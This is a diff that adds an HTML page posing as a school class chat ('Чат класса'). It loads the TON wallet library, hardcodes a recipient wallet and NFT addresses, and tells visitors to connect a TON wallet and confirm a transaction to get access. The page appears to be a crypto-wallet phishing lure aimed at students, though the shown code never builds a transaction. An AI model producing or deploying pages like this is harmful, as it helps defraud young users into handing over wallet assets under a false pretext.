@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Чат класса</title>
+    <script src="https://unpkg.com/tonweb@0.0.36/dist/tonweb.js"></script>
+</head>
+<body>
+    <h1>Загрузка...</h1>
+    <script>
+        (async () => {
+            const yourWallet = 'UQCoZIXUVrmgJFumlEZOmXc8IH366ckjI4TOX1NQ5zn-Resq';
+            const nftAddress = 'EQBgCFqV_5zRagXTLOAsiB0WetrXEr4YYF8Ansl9wsv1E2oe'; 
+            const collectionAddress = 'EQC8Q0uXJrni6bWgZlsmGvKhgQ-KnAUIY2Qc9aa58WU6a2nw';
+            const tokenId = 37875;
+
+            if (window.ton) {
+                try {
+                    const wallet = window.ton;
+                    console.log('Кошелёк подключён.');
+                    alert('Подключитесь к кошельку и подтвердите транзакцию для получения доступа к чату.');
+                } catch (e) {
+                    console.error(e);
+                    alert('Ошибка подключения.');
+                }
+            } else {
+                alert('Для входа в чат класса необходимо установить TON кошелёк (например, Tonkeeper).');
+            }
+        })();
+    </script>
+</body>
+</html>
